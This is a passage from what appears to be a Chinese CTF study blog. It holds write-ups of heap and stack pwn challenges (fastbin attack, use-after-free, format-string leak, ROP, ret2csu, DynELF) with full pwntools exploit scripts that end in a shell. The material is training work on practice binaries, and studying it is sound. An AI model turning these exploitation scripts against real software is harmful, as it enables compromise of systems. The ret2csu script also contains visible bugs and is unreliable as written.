href=\"file:///Users/rin/Library/Application%20Support/typora-user-images/%E6%88%AA%E5%B1%8F2022-03-15%20%E4%B8%8B%E5%8D%889.38.49.png?lastModify=1647351509\" data-caption=\"截屏2022-03-15 下午9.38.49\" data-fancybox=\"images\"><img src=\"file:///Users/rin/Library/Application%20Support/typora-user-images/%E6%88%AA%E5%B1%8F2022-03-15%20%E4%B8%8B%E5%8D%889.38.49.png?lastModify=1647351509\" alt=\"截屏2022-03-15 下午9.38.49\"></a></p>\n<p>这个地址是我们fake chunk的size位，也就是说明这个chunk申请时应该为0x40。也就是所有chunk都应该是0x40大小。</p>\n<pre><code class=\"python\">add(0x40)\nadd(0x40)\nfree(0)\nfree(1)\n</code></pre>\n<p>​        然后再将此时先被free的chunk的fd覆盖为0x602080</p>\n<p>​        <a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-15%20%E4%B8%8B%E5%8D%888.43.43.png\" data-caption=\"截屏2022-03-15 下午8.43.43\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-15%20%E4%B8%8B%E5%8D%888.43.43.png\" alt=\"截屏2022-03-15 下午8.43.43\"></a></p>\n<p>​        此时连续add三个chunk，第三个就是我们需要的地址了</p>\n<pre><code class=\"python\">from pwn import *\n\nlibc = ELF(\"/glibc/2.23/64/lib/libc-2.23.so\")\ncontext.terminal = ['tmux','splitw','-h']\ncontext.log_level = \"debug\"\n\nif args['REMOTE']:\n    p = remote(\"node4.buuoj.cn\",27982)\nelse:\n    p = process([\"/glibc/2.23/64/lib/ld-2.23.so\",\"./wustctf2020_easyfast\"],env={\"LD_PRELOAD\" : \"/glibc/2.23/64/lib/libc.so.6\"})\n\ndef cmd(idx):\n    p.recvuntil('choice&gt;')\n    p.sendline(str(idx))\n\n\ndef add(size):\n    cmd(1)\n    p.recvuntil('size&gt;')\n    p.sendline(str(size))\n\n\ndef free(idx):\n    cmd(2)\n    p.recvuntil('index&gt;')\n    p.sendline(str(idx))\n\ndef edit(idx,content):\n    cmd(3)\n    p.recvuntil('index&gt;')\n    p.sendline(str(idx))\n    p.sendline(content)\n    \nadd(0x40)\nadd(0x40)\nfree(0)\nfree(1)\ngdb.attach(p)\nedit(0,p64(0x602080))\nadd(0x40)\nadd(0x40)\nadd(0x40)\n\nedit(3,p64(0))\np.sendafter(\"choice&gt;\\n\",\"4\")\np.interactive()\n</code></pre>\n<h4 id=\"总结\">总结<a class=\"post-anchor\" href=\"#总结\"></a></h4><p>​        其实没有什么好总结的，这算是最水的一类堆题了，纯粹是太久没有做复健一下，一晚上能做三四道。</p>\n</body></html>","tags":["week"]},{"title":"lab 10 hacknote","url":"/2022/03/15/week3-1.2/","content":"<html><head></head><body><p>​        这个题已经做过好多遍了orz，因为不断的摆烂然后复健…..每次又是做这道</p>\n<p>​        逆一下。</p>\n<p>​        话说可以总结一下类似的题目的快速逆向方法。比如说一般肯定会定义一个结构体，结构体中包含比如content和指针的字段，然后如果有可以利用的uaf或者double free的话，就可以覆盖结构体中保存的指针字段，从而进一步攻击。</p>\n<p>​        回到这道题，这里的结构体包含两个字段，一个是<code> print_note_content</code>这个函数的地址，另外一个是结构体的content。</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-16%20%E4%B8%8A%E5%8D%8810.51.14.png\" data-caption=\"截屏2022-03-16 上午10.51.14\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-16%20%E4%B8%8A%E5%8D%8810.51.14.png\" alt=\"截屏2022-03-16 上午10.51.14\"></a></p>\n<p>随便申请一个note，chunk布局长这样（因为是32位的程序，所以显示上有些bug，但不影响）</p>\n<p>​        0x804865b就是<code>print_note_content</code>函数的地址，然后前面一个估计是堆上的地址。</p>\n<pre><code class=\"c\">  if ( *(&amp;notelist + v1) )\n    (*(void (__cdecl **)(_DWORD))*(&amp;notelist + v1))(*(&amp;notelist + v1));\n</code></pre>\n<p>​            接着如果put note，这个print函数就会调用这个<code>print note</code>字段。所以利用思路就是利用UAf然后修改chunk中<code>print note</code>字段的地址为<code>magic()</code>的地址，然后再尝试puts此chunk，就相当于调用了<code>magic()</code>。</p>\n<p>​        但是由于程序并没有直接给出edit的功能，我们需要想办法在合适位置构建fake chunk，使得chunk的print字段正好处于我们可以任意写入内容的fake chunk的content字段。</p>\n<p>​        需要注意的就是free note的过程是分别按顺序先释放content chunk再释放put chunk，并且两个chunk的size不同，fastbin链表的种类也不同，分配的顺序也不同。</p>\n<pre><code class=\"python\">from pwn import *\n\nlibc = ELF(\"/glibc/2.23/32/lib/libc-2.23.so\")\ncontext.terminal = ['tmux','splitw','-h']\ncontext.log_level = \"debug\"\n\n'''\nif args['REMOTE']:\n    p = remote(\"node4.buuoj.cn\",27999)\nelse:\n    '''\np = process([\"/glibc/2.23/32/lib/ld-2.23.so\",\"./hackernote\"],env={\"LD_PRELOAD\" : \"/glibc/2.23/32/lib/libc.so.6\"})\n\nmagic = 0x08048986\n\ndef cmd(idx):\n    p.recvuntil(\"Your choice :\")\n    p.sendline(str(idx))\n\ndef add(size,content):\n    cmd(1)\n    p.recvuntil('Note size :')\n    p.sendline(str(size))\n    p.recvuntil(\"Content :\")\n    p.sendline(content)\n\ndef free(idx):\n    cmd(2)\n    p.recvuntil('Index :')\n    p.sendline(str(idx))\n\ndef put(idx):\n    cmd(3)\n    p.recvuntil('Index :')\n    p.sendline(str(idx))\n\nadd(0x20,b\"aabb\")#chunk0 [chunk0_print(0x10),chunk0_content(0x20)]\nadd(0x20,b\"aabb\")#chunk1 [chunk0_print(0x10),chunk0_content(0x20)]\nfree(0)\n\n#main_arena =&gt; chunk0_print(0x10) =&gt; chunk0_content(0x20)\nfree(1)\n#fastbin:\n#main_arena =&gt; chunk1_print(0x10) =&gt; chunk0_print(0x10) \n#main_arena =&gt; chunk1_content(0x20) =&gt; chunk0_content(0x20)\n\ngdb.attach(p)\nadd(8,p32(magic))\n#chunk2, with 0x10 puts_field and 0x8 content field ,the memory space is poniter to chunk1_print and chunk0_print \nput(0)\n\np.interactive()\n</code></pre>\n<p>​        </p>\n<p>​        </p>\n<p>​        这个高亮怎么这么怪，为什么多行注释当作字符串处理了啊。</p>\n<p>​        </p>\n<p>​        </p>\n</body></html>","tags":["week"]},{"title":"hctf2016_fheap","url":"/2022/03/16/week3-2.1/","content":"<p>​    </p>\n<p>​        第三周第二天第一道堆题。应该是一道中等偏下的fastbinattack。</p>\n<p>​        libc是2.23。</p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-16%20%E4%B8%8B%E5%8D%881.17.22.png\" alt=\"截屏2022-03-16 下午1.17.22\"></p>\n<p>​        保护全开，pie是个麻烦点。</p>\n<p>​        逆向一下，这个程序的逻辑不算很复杂，但是也需要逆清楚。</p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-16%20%E4%B8%8B%E5%8D%883.21.47.png\" alt=\"截屏2022-03-16 下午3.21.47\"></p>\n<p>​        程序在ptr+3的地方保存了一个有着free函数功能的指针，并且当delete str时，也是调用这个指针，而不是free函数本身，所以可以覆盖它为任意函数指针。</p>\n<p>​        为了泄露内存，我们可以尝试调用<code>printf</code>，并构造格式化字符串，找到system的地址，然后可以故技重施，将指针覆盖为system，从而getshell。</p>\n<p>​        所以利用的第一步就是覆盖这个free指针为<code>printf</code>指针，由于程序开启了pie，我们只需要，也只能覆盖指针的最后两个字节。</p>\n<p>​        对于格式化字符串，（其实我不太会》〉》〉这两天多刷一些吧，目前就copy一下大佬的exp）</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">&quot;/glibc/2.23/64/lib/libc-2.23.so&quot;</span>)</span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">context.log_level = <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">if args[&#x27;REMOTE&#x27;]:</span></span><br><span class=\"line\"><span class=\"string\">    p = remote(&quot;node4.buuoj.cn&quot;,27999)</span></span><br><span class=\"line\"><span class=\"string\">else:</span></span><br><span class=\"line\"><span class=\"string\">    &#x27;&#x27;&#x27;</span></span><br><span class=\"line\">r = process([<span class=\"string\">&quot;/glibc/2.23/64/lib/ld-2.23.so&quot;</span>,<span class=\"string\">&quot;./pwn-f&quot;</span>],env=&#123;<span class=\"string\">&quot;LD_PRELOAD&quot;</span> : <span class=\"string\">&quot;/glibc/2.23/64/lib/libc.so.6&quot;</span>&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span>(<span class=\"params\">size,content</span>):</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;3.quit&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">&quot;create &quot;</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;Pls give string size:&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;str:&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(content))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">free</span>(<span class=\"params\">idx</span>):</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;3.quit&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">&quot;delete &quot;</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;id:&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;Are you sure?:&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">&quot;yes&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">10</span>,<span class=\"string\">&quot;aaaa&quot;</span>)<span class=\"comment\">#chunk0(0x20)</span></span><br><span class=\"line\">add(<span class=\"number\">10</span>,<span class=\"string\">&quot;bbbb&quot;</span>)<span class=\"comment\">#chunk1(0x20)</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">1</span>)<span class=\"comment\">#main_arena =&gt; chunk1</span></span><br><span class=\"line\">free(<span class=\"number\">0</span>)<span class=\"comment\">#main_arena=&gt; chunk0 =&gt; chunk1</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">25</span>,<span class=\"string\">b&#x27;Start%176$pEnd&#x27;</span>.ljust(<span class=\"number\">24</span>,<span class=\"string\">b&#x27;a&#x27;</span>) + <span class=\"string\">b&#x27;\\xb6&#x27;</span>)<span class=\"comment\">#chukn2 ,point to chunk0</span></span><br><span class=\"line\">free(<span class=\"number\">1</span>)<span class=\"comment\">#print chunk</span></span><br><span class=\"line\">r.recvuntil(<span class=\"string\">&quot;Start&quot;</span>)</span><br><span class=\"line\">libc_start_main = u64(r.recvline(<span class=\"string\">&quot;END&quot;</span>,drop = <span class=\"literal\">True</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(libc_start_main))</span><br><span class=\"line\"></span><br><span class=\"line\">libc_base = libc_start_main - libc.symbols[__libc_start_main]</span><br><span class=\"line\">system_addr = libc_base + libc.symbols[system]</span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">32</span>,<span class=\"string\">b&quot;/bin/sh;&quot;</span>.ljust(<span class=\"number\">24</span>,<span class=\"string\">b&#x27;a&#x27;</span>) + p64(system_addr))</span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>​        </p>\n","categories":["heap"],"tags":["week"]},{"title":"week3-2.2","url":"/2022/03/16/week3-2.2/","content":"<p>​    </p>\n<h4 id=\"ccmc-pwnme2\"><a href=\"#ccmc-pwnme2\" class=\"headerlink\" title=\"ccmc_pwnme2\"></a>ccmc_pwnme2</h4><p>一道看起来人畜无害的栈题。但是有几个非常奇怪的函数。</p>\n<p>​        所以这是一道相对有些奇怪的rop，控制这三个函数的其中两个的参数为指定字符串，就能较为方便地读取flag。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">p = remote(<span class=\"string\">&#x27;node4.buuoj.cn&#x27;</span>,<span class=\"number\">27653</span>)</span><br><span class=\"line\"><span class=\"comment\">#p = process(&#x27;./pwnme2&#x27;)</span></span><br><span class=\"line\">pop_edi_ebp_ret= <span class=\"number\">0x0804867f</span></span><br><span class=\"line\">pop_ebp_ret = <span class=\"number\">0x08048680</span></span><br><span class=\"line\"></span><br><span class=\"line\">add_home = <span class=\"number\">0x08048644</span></span><br><span class=\"line\">add_flag = <span class=\"number\">0x08048682</span></span><br><span class=\"line\">exec_string  = <span class=\"number\">0x080485CB</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">112</span>  + p32(add_home) + p32(pop_ebp_ret) + p32(<span class=\"number\">0xDEADBEEF</span>) </span><br><span class=\"line\">payload += p32(add_flag) + p32(pop_edi_ebp_ret) + p32(<span class=\"number\">0xCAFEBABE</span>) + p32(<span class=\"number\">0xABADF00D</span>) </span><br><span class=\"line\">payload += p32(exec_string)</span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n<p>​    </p>\n<p>​    ps：感觉还需要再多做一些rop</p>\n<h4 id=\"PicoCTF-2018-got-shell\"><a href=\"#PicoCTF-2018-got-shell\" class=\"headerlink\" title=\"PicoCTF_2018_got-shell\"></a>PicoCTF_2018_got-shell</h4><p>​        虽然但是，这个题为什么这么pwncollege。guide的风格，函数的名字。。。完全一致好吧。</p>\n<p>​        可以写4字节，正好可以修改got表为后门函数。那就修改puts咯？</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-16%20%E4%B8%8B%E5%8D%889.16.16.png\" alt=\"截屏2022-03-16 下午9.16.16\"></p>\n<p>​            美丽畅畅的暴击（只要我不尴尬，尴尬的就是。）</p>\n<h4 id=\"jarvisoj-level5\"><a href=\"#jarvisoj-level5\" class=\"headerlink\" title=\"jarvisoj_level5\"></a>jarvisoj_level5</h4><p>​        这个题吧，我好像以前做过，是个纯纯的ret2csu的板子题。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> LibcSearcher</span><br><span class=\"line\"></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">context.log_level = <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"><span class=\"comment\">#libc = ELF(&quot;&quot;)</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">&quot;./level3_x64&quot;</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">&quot;./level3_x64&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">0ffset = <span class=\"number\">0x88</span><span class=\"comment\">#(test)</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">csu_front_addr = <span class=\"number\">0x400690</span></span><br><span class=\"line\">csu_end_addr = <span class=\"number\">0x4006AA</span></span><br><span class=\"line\"></span><br><span class=\"line\">puts_plt = elf.plt[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">libc_start_main_got = elf.got[<span class=\"string\">&#x27;__libc_start_main&#x27;</span>]</span><br><span class=\"line\">main = elf.symbols[<span class=\"string\">&#x27;main&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">write_got = elf.got[<span class=\"string\">&#x27;write&#x27;</span>]</span><br><span class=\"line\">read_got = elf.got[<span class=\"string\">&#x27;read&#x27;</span>]</span><br><span class=\"line\">main_addr = elf.symbols[<span class=\"string\">&#x27;main&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">csu</span>(<span class=\"params\">rbx, rbp, r12, r13, r14, r15, last</span>):</span></span><br><span class=\"line\">    <span class=\"comment\"># pop rbx,rbp,r12,r13,r14,r15</span></span><br><span class=\"line\">    <span class=\"comment\"># rbx should be 0,</span></span><br><span class=\"line\">    <span class=\"comment\"># rbp should be 1,enable not to jump</span></span><br><span class=\"line\">    <span class=\"comment\"># r12 should be the function we want to call</span></span><br><span class=\"line\">    <span class=\"comment\"># rdi=edi=r15d</span></span><br><span class=\"line\">    <span class=\"comment\"># rsi=r14</span></span><br><span class=\"line\">    <span class=\"comment\"># rdx=r13</span></span><br><span class=\"line\">    payload = <span class=\"string\">b&#x27;a&#x27;</span> * offset </span><br><span class=\"line\">    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)</span><br><span class=\"line\">    payload += p64(csu_front_addr)</span><br><span class=\"line\">    payload += <span class=\"string\">&#x27;a&#x27;</span> * (offset - <span class=\"number\">0x48</span>)</span><br><span class=\"line\">    payload += p64(last)</span><br><span class=\"line\">    p.send(payload)</span><br><span class=\"line\">    sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">csu(<span class=\"number\">0</span>, <span class=\"number\">1</span>, write_got, <span class=\"number\">8</span>, write_got, <span class=\"number\">1</span>, main_addr)</span><br><span class=\"line\">write_addr = u64(p.recv(<span class=\"number\">8</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">libc = LibcSearcher(<span class=\"string\">&#x27;write&#x27;</span>, write_addr)</span><br><span class=\"line\">libc_base = write_addr - libc.dump(<span class=\"string\">&#x27;write&#x27;</span>)</span><br><span class=\"line\">execve_addr = libc_base + libc.dump(<span class=\"string\">&#x27;execve&#x27;</span>)</span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;execve_addr &#x27;</span> + <span class=\"built_in\">hex</span>(execve_addr))</span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">libc = LibcSearcher(&#x27;__libc_start_main&#x27;, libc_start_main_addr)</span></span><br><span class=\"line\"><span class=\"string\">libcbase = libc_start_main_addr - libc.dump(&#x27;__libc_start_main&#x27;)</span></span><br><span class=\"line\"><span class=\"string\">system_addr = libcbase + libc.dump(&#x27;system&#x27;)</span></span><br><span class=\"line\"><span class=\"string\">binsh_addr = libcbase + libc.dump(&#x27;str_bin_sh&#x27;)</span></span><br><span class=\"line\"><span class=\"string\">log.success(&#x27;system_addr &#x27; + hex(system_addr))</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\">csu(<span class=\"number\">0</span>, <span class=\"number\">1</span>, read_got, <span class=\"number\">16</span>, bss_base, <span class=\"number\">0</span>, main_addr)</span><br><span class=\"line\">p.send(p64(execve_addr) + <span class=\"string\">&#x27;/bin/sh\\x00&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;Hello, World\\n&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">## execve(bss_base+8)</span></span><br><span class=\"line\">csu(<span class=\"number\">0</span>, <span class=\"number\">1</span>, bss_base, <span class=\"number\">0</span>, <span class=\"number\">0</span>, bss_base + <span class=\"number\">8</span>, main_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n","categories":["stack"],"tags":["week stack"]},{"title":"DynELF学习","url":"/2022/03/16/DynELF/","content":"<html><head></head><body><h3 id=\"0\">0<a class=\"post-anchor\" href=\"#0\"></a></h3><p>​        我发现我居然还不太会用这个东西，可以用不上，但是不能不会。</p>\n<h4 id=\"1\">1<a class=\"post-anchor\" href=\"#1\"></a></h4><p>​        DynELF的意义在于当我们无法找到目标libc中具体的符号偏移时，可以利用它来搜索内存中的函数地址,而不需要再通过libc来获取。</p>\n<h5 id=\"如何使用？\">如何使用？<a class=\"post-anchor\" href=\"#如何使用？\"></a></h5><pre><code class=\"python\">p = process('./pwnme')\n\n# Declare a function that takes a single address, and\n# leaks at least one byte at that address.\ndef leak(address):\n    data = p.read(address, 4)\n    log.debug(\"%#x =&gt; %s\" % (address, (data or '').encode('hex')))\n    return data\n\n# For the sake of this example, let's say that we\n# have any of these pointers.  One is a pointer into\n# the target binary, the other two are pointers into libc\nmain   = 0xfeedf4ce\nlibc   = 0xdeadb000\nsystem = 0xdeadbeef\n\n# With our leaker, and a pointer into our target binary,\n# we can resolve the address of anything.\n#\n# We do not actually need to have a copy of the target\n# binary for this to work.\nd = DynELF(leak, main)\nassert d.lookup(None,     'libc') == libc\nassert d.lookup('system', 'libc') == system\n\n# However, if we *do* have a copy of the target binary,\n# we can speed up some of the steps.\nd = DynELF(leak, main, elf=ELF('./pwnme'))\nassert d.lookup(None,     'libc') == libc\nassert d.lookup('system', 'libc') == system\n\n# Alternately, we can resolve symbols inside another library,\n# given a pointer into it.\nd = DynELF(leak, libc + 0x1234)\nassert d.lookup('system')      == system\n</code></pre>\n<p>​            </p>\n<p>​        大致描述一下，就是先用<code>leak()</code>函数按照原本ret2xx的方法用stdout函数来打印addr的数据，然后</p>\n<pre><code class=\"python\">d = DynELF(leak, main)\nsystem_addr = d.lookup('system', 'libc')\n</code></pre>\n<p>​        来找到system的地址。</p>\n<p>​        </p>\n<h5 id=\"原理？\">原理？<a class=\"post-anchor\" href=\"#原理？\"></a></h5><p>​        这个module其实非常好用，指不知道原理也能用。</p>\n<p>​        DynELF泄露地址的过程原理通常分为两步，首先通过暴力对比找到libc的内存加载基址。</p>\n<p>​        在找libc之前还需要找到elf文件在内存中的加载基址。</p>\n<h6 id=\"寻找elf文件加载基址\">寻找elf文件加载基址<a class=\"post-anchor\" href=\"#寻找elf文件加载基址\"></a></h6><p>​        基地址内存页起始的字符串为<code>\\0x7fELF</code>，所以可以指定内存中的地址，然后对地址进行页对齐，再与当前内存页起始字符串进行对比，如果不符合则不断与更低地址内存页的起始字符串对比，直到找到。</p>\n<h6 id=\"寻找glibc加载基址\">寻找glibc加载基址<a class=\"post-anchor\" href=\"#寻找glibc加载基址\"></a></h6><p>​        efl在内存中有一个叫做<code>link_map</code>的双向链表，在学习ret2dl的时候遇见过，大致是指向elf的一些表项相关数据结构的链表。</p>\n<p>​        对于如何找到<code>link_map</code>    ,一般来说有两种方式，在full relro以外的elf中，可以在<code>Dynamic</code>段的<code>.got.plt</code>节中找到，对于启用full relro的elf，可以在<code>Dynamic</code>段的<code>DT_DEBUG</code>中找到。</p>\n<p>​        <code>Dynamic</code>段的地址则需要通过ELF文件的段表得到，由于我们已经获得了ELF的内存基地址，所以也能得到段表的地址。</p>\n<h6 id=\"在libc中寻找hash表，动态符号表与字符串表基地址\">在libc中寻找hash表，动态符号表与字符串表基地址<a class=\"post-anchor\" href=\"#在libc中寻找hash表，动态符号表与字符串表基地址\"></a></h6><p>​        通过上面两步我们已经获得了libc的基地址，因此很容易得到所有与函数相关的hash表，动态符号表以及字符串表的基地址。最后，可以通过hash表得到system的地址。</p>\n<p>​        </p>\n<h4 id=\"参考\">参考<a class=\"post-anchor\" href=\"#参考\"></a></h4><p>​    <a href=\"https://www.freebuf.com/articles/system/193646.html\">Pwntools之DynELF原理探究</a></p>\n<p>​        </p>\n<p>​    <a href=\"https://uaf.io/exploitation/misc/2016/04/02/Finding-Functions.html\">Finding Function’s Load Address</a></p>\n</body></html>","tags":["mess"]},{"title":"week3-3.1","url":"/2022/03/17/week3-3.1/","content":"<html><head></head><body><p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-19%20%E4%B8%8B%E5%8D%885.35.57.png\" data-caption=\"截屏2022-03-19 下午5.35.57\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-19%20%E4%B8%8B%E5%8D%885.35.57.png\" alt=\"截屏2022-03-19 下午5.35.57\"></a></p>\n<p>​    </p>\n<h2 id=\"xdctf2015-pwn200\">xdctf2015_pwn200<a class=\"post-anchor\" href=\"#xdctf2015-pwn200\"></a></h2><p>​    </p>\n<p>​        练习一下DynELF。</p>\n<p>​        看起来像ret2csu+DynELF。</p>\n<p>​        没啥好分析的，溢出112,然后直接写leak函数。</p>\n<pre><code class=\"python\">\ndef leak(addr):\n    payload = b'a'*offset\n    payload += p32(write_plt)\n    payload += p32(ret_addr)\n    payload += p32(1)\n    payload += p32(addr)\n    payload += p32(4)\n    p.send(payload)\n    data = p.recv()\n    log.info(\"leaking: 0x%x --&gt; %s\" % (addr, (data or '').encode('hex')))\n    return data\n\nd = DynELF(leak,elf = elf)\n\nsystem_addr = d.lookup('system','libc')\nlog.info(\"system address: 0x%x\" % system_addr)\n</code></pre>\n<p>​        </p>\n<p>​        一般来说这个模块的利用就是通过stdout的函数来泄露某个地址，然后再暴力寻找，相对普通的ret2libc其实更为方便快捷，我不知道为什么感觉用的人很少。</p>\n<p>ps：关于整体布栈还是有一些小的疑问。</p>\n<h3 id=\"mrctf2020-shellcode-revenge\">mrctf2020_shellcode_revenge<a class=\"post-anchor\" href=\"#mrctf2020-shellcode-revenge\"></a></h3><h4 id=\"overview\">overview<a class=\"post-anchor\" href=\"#overview\"></a></h4><p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-19%20%E4%B8%8B%E5%8D%884.33.15.png\" data-caption=\"截屏2022-03-19 下午4.33.15\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-19%20%E4%B8%8B%E5%8D%884.33.15.png\" alt=\"截屏2022-03-19 下午4.33.15\"></a></p>\n<p>看起来像ret2shellcode。</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-19%20%E4%B8%8B%E5%8D%884.36.32.png\" data-caption=\"截屏2022-03-19 下午4.36.32\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-19%20%E4%B8%8B%E5%8D%884.36.32.png\" alt=\"截屏2022-03-19 下午4.36.32\"></a></p>\n<h4 id=\"逆向\">逆向<a class=\"post-anchor\" href=\"#逆向\"></a></h4><p>​        不知道为什么ida不能一键f5，不过也懒得修了，程序逻辑也比较简单，就是一个write和read。然后程序会对输入的字符进行ascii码的大小的比较，<a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-19%20%E4%B8%8B%E5%8D%885.00.43.png\" data-caption=\"截屏2022-03-19 下午5.00.43\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-19%20%E4%B8%8B%E5%8D%885.00.43.png\" alt=\"截屏2022-03-19 下午5.00.43\"></a></p>\n<p>​        <a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-19%20%E4%B8%8B%E5%8D%884.52.21.png\" data-caption=\"截屏2022-03-19 下午4.52.21\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-19%20%E4%B8%8B%E5%8D%884.52.21.png\" alt=\"截屏2022-03-19 下午4.52.21\"></a></p>\n<p>​        分析一下这个流程图，我们的目的是执行<code>loc_1236</code>，一共有三个箭头指向它，归纳以后分别是<code>(0x60,0x7A)</code>,<code>(0x2f,0x5A)</code>,ascii在这些范围内的字符会被读入buf，然后<code>call rax</code>，也就是执行了我们输入的shellcode。</p>\n<h4 id=\"利用\">利用<a class=\"post-anchor\" href=\"#利用\"></a></h4><p>​        由于题目本身的设置，我们并不需要像常规那样先泄露什么栈上的地址，只需要绕过题目的检测。虽然但是，搞不懂这个字符ackii码的限制意义何在。去摸了一下ackii表，发现这个范围内的字符都是数字或者字母。</p>\n<p>​        所以把shellcode转换成这些范围内的字符，然后直接传输就行。</p>\n<h3 